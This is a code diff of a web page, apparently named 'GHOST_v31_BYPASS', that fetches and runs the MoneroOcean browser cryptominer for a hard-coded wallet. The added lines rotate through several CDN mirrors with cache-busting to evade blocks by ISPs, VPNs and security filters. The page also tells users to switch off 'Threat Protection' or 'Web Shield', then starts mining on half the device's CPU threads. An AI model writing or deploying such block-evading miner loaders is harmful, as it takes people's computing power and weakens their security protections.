@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>GHOST_v31_BYPASS</title>
+    <title>GHOST_v31_BYPASS_FIXED</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <style>
         :root { --ai: #00ff41; --bg: #0a0a0a; --dim: #1a1a1a; }
         body { background: var(--bg); color: var(--ai); font-family: monospace; padding: 20px; text-align: center; }
         .shell { border: 2px solid var(--dim); padding: 20px; border-radius: 12px; max-width: 400px; margin: auto; }
-        #log { font-size: 10px; color: #666; height: 100px; overflow-y: auto; background: #000; padding: 10px; margin-top: 10px; text-align: left; border: 1px solid #222; }
-        button { width: 100%; padding: 15px; background: var(--ai); border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #log { font-size: 10px; color: #666; height: 120px; overflow-y: auto; background: #000; padding: 10px; margin-top: 10px; text-align: left; border: 1px solid #222; }
+        button { width: 100%; padding: 15px; background: var(--ai); border: none; font-weight: bold; cursor: pointer; margin-top: 10px; color: #000; }
         .status-box { margin-bottom: 20px; border-bottom: 1px solid var(--dim); padding-bottom: 10px; }
     </style>
 </head>
@@ -21,29 +21,43 @@
         </div>
 
         <button id="start_btn">FORCE INITIALIZE</button>
-        <div id="log">> Boot sequence ready...</div>
+        <div id="log">> System ready. Standing by...</div>
     </div>
 
 <script>
     const WALLET = "4AkqQGGvvYUdKo66Q7qbq389Sp7AvMtX4SRLuSpsp9VZEFeaQhSCJCdZY4wWK1Ztrs8NCAwLnUZZNE9TQzgpZ1SBRiV1zqp";
-    let retryCount = 0;
+    let retryIndex = 0;
+
+    // A list of different CDNs to bypass specific provider blocks
+    const SOURCES = [
+        "https://cdn.jsdelivr.net/gh/MoneroOcean/moneroocean.github.io@master/webminer.js",
+        "https://cdn.statically.io/gh/MoneroOcean/moneroocean.github.io/master/webminer.js",
+        "https://raw.githack.com/MoneroOcean/moneroocean.github.io/master/webminer.js",
+        "https://fastly.jsdelivr.net/gh/MoneroOcean/moneroocean.github.io@master/webminer.js"
+    ];
 
     const log = (m) => {
         const t = new Date().toLocaleTimeString();
         document.getElementById('log').innerHTML = `[${t}] ${m}<br>` + document.getElementById('log').innerHTML;
     };
 
-    // This function forces a fresh fetch to bypass browser blocks
     async function forceLoadMiner() {
         if (typeof MoneroOcean !== 'undefined') {
             startEngine();
             return;
         }
 
-        log("Bypassing cache & fetching core...");
+        if (retryIndex >= SOURCES.length) {
+            log("CRITICAL: All mirrors blocked. Disable VPN 'Threat Protection' or 'Web Shield'.");
+            retryIndex = 0; // Reset for next manual attempt
+            return;
+        }
+
+        log(`Fetching core from Source ${retryIndex + 1}...`);
+        
         const script = document.createElement('script');
-        // Added a timestamp parameter to prevent the browser from using a cached (blocked) version
-        script.src = "https://cdn.jsdelivr.net/gh/MoneroOcean/moneroocean.github.io@master/webminer.js?v=" + Date.now();
+        // Cache busting helps bypass local ISP/VPN cached block pages
+        script.src = SOURCES[retryIndex] + "?cb=" + Math.random().toString(36).substring(7);
         
         script.onload = () => {
             log("Core successfully injected.");
@@ -51,13 +65,9 @@
         };
 
         script.onerror = () => {
-            retryCount++;
-            log(`Fetch failed (Attempt ${retryCount})...`);
-            if (retryCount < 3) {
-                setTimeout(forceLoadMiner, 2000); // Retry every 2 seconds
-            } else {
-                log("CRITICAL: CDN Blocked. Use a VPN or Disable AdBlock.");
-            }
+            log(`Source ${retryIndex + 1} failed. Rotating...`);
+            retryIndex++;
+            setTimeout(forceLoadMiner, 1500); 
         };
 
         document.head.appendChild(script);
@@ -67,9 +77,9 @@
         try {
             const miner = new MoneroOcean.Miner({
                 address: WALLET,
-                cmd: "Mobile_Bypass_v31",
+                cmd: "Mobile_Bypass_v32",
                 threads: Math.max(1, navigator.hardwareConcurrency / 2),
-                throttle: 0.2 // 20% Idle to prevent phone from melting
+                throttle: 0.3 // Adjusted to 30% for better mobile stability
             });
 
             miner.start();
